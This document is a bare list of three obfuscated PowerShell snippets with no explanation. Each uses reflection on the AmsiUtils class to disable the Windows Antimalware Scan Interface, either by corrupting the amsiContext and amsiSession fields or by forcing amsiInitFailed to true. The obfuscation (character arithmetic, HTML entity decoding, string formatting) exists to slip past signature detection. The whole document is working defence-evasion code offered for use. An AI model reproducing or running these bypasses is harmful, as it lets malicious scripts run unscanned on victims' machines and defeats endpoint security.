-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```powershell
$TZTTGYMX=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((11333-2257));[Ref].Assembly.GetType("System.Management.Automation.$([ChAr](65)+[Char]([BYte]0x6D)+[ChAR](44+71)+[ChAr]([bytE]0x69))Utils").GetField("$([Char]([ByTe]0x61)+[cHaR]([ByTe]0x6D)+[cHAR](2760/24)+[char](27+78))Session", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([ChAr](65)+[Char]([BYte]0x6D)+[ChAR](44+71)+[ChAr]([bytE]0x69))Utils").GetField("$([Char]([ByTe]0x61)+[cHaR]([ByTe]0x6D)+[cHAR](2760/24)+[char](27+78))Context", "NonPublic,Static").SetValue($null, [IntPtr]$TZTTGYMX);
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($([SySteM.net.weBUtIlITy]::htmlDeCOde('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#82;&#101;&#102;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#46;&#66;&#105;&#110;&#100;&#105;&#110;&#103;&#70;&#108;&#97;&#103;&#115;')))).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType('System.Management.Automation.'+$([SysTeM.nET.WEButiLIty]::HTmlDeCOdE('&#65;&#109;&#115;&#105;'))+'Utils')),('GetField')).Invoke(''+$([systEm.net.weBuTiLiTY]::HTmLdECOde('&#97;&#109;&#115;&#105;'))+'InitFailed',(('NonPublic,Static') -as [String].Assembly.GetType($([SySteM.net.weBUtIlITy]::htmlDeCOde('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#82;&#101;&#102;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#46;&#66;&#105;&#110;&#100;&#105;&#110;&#103;&#70;&#108;&#97;&#103;&#115;'))))).SetValue($null,$True);
``` 
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```powershell
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)
```
--------------------------------------------
